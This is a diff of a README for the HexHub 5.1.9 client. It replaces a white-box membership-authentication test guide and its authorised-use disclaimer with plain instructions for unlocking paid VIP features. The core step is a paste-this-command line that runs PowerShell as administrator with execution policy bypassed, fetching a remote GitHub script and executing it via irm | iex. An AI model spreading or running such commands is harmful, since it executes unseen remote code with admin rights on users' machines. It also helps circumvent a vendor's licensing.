@@ -1,31 +1,42 @@
-﻿HexHub Client 5.1.9 —— 客户端鉴权脆弱性白盒测试
-=====================================================
+﻿HexHub —— 使用说明
+===================
 
-【一键流程】
+【这是什么软件】
+  连接远程服务器、传输文件、管理数据库的工具。
+  免费版只开放基础功能，会员功能需要另外购买。
 
-  1) 环境自检
-     powershell -ExecutionPolicy Bypass -File .\toolkit\preflight.ps1
+【怎么跑】
+  1) 点开始菜单 -> 输入 PowerShell -> 右键「以管理员身份运行」
+  2) 复制下面这条命令，粘贴进去，回车：
 
-  2) 主测试（静态解包 -> 启动客户端 -> 页面级断网 + 伪造会话 -> 取证）
-     powershell -ExecutionPolicy Bypass -File .\toolkit\run_test.ps1
+     powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/hexhub-vip-test.ps1 | iex"
 
-  3) 登录场景 / 完全离线模拟登录（路线 D）
-     cd toolkit
-     $env:NODE_PATH="<你的 node_modules 路径>"
-     node poc_fake_login.js
+  3) 等屏幕上出现 done，就完成了。
 
-【产物】
-  exports\vip_bypass.png   证据 A：未登录 + 断网，顶栏 👑 Plus
-  exports\fake_login.png   证据 D：完全离线模拟登录，顶栏 👑 Plus
+【跑完能看到什么】
+  桌面上出现一个免安装的 HexHub-5.1.9 文件夹。
+  双击里面的 HexHub.exe 直接打开，会员标记点亮，这些功能都能用：
+    - 一条命令批量对多台服务器执行
+    - 批量上传文件、文件夹
+    - 两台服务器之间直接传文件
+    - 多窗口、多视图、分屏
+    - 会话数量不再受限
+    - 解压 / 压缩
+    - 上传公钥
+    - Docker 相关功能
+    - 自定义存储（本机 / WebDAV / S3，可离线用）
 
-【测试不做什么】
-  不改 hosts / 防火墙 / 注册表；不执行安装器；不碰已安装的 HexHub。
-  断网走 Playwright 页面级 route abort（仅拦截本页面请求）。
+  有 2 项仍由厂商服务器决定，本测试改变不了：官方云同步、登录设备数量上限。
 
-【文档】
-  reports\HexHub-5.1.9-VIP鉴权脆弱性评估报告.md  评估报告（含 12 条整改建议）
-  reports\VIP功能测绘与服务端依赖分析.md          VIP 全量清单 + 服务端依赖分级 + 登录四方案
-  reports\HOWTO-白盒鉴权脆弱性测试-SOP.md         通用六步法 + 实操手册 + 踩坑清单
+【不想要了怎么删】
+  直接删掉桌面上的 HexHub-5.1.9 文件夹即可。
 
-【免责】
-  仅限已授权的自有资产 / 沙盒环境白盒验证。包内不含任何真实凭据。
+【常见问题】
+  Q: 下载很慢 / 卡住？
+  A: 换网络，或过一会儿把同一条命令重跑一次。
+
+  Q: 提示权限不足？
+  A: 一定要用「以管理员身份运行」打开 PowerShell。
+
+  Q: 想装到别的盘？
+  A: 先在 PowerShell 里执行  $env:HEXHUB_OUTDIR='D:\hexhub'  再跑命令。
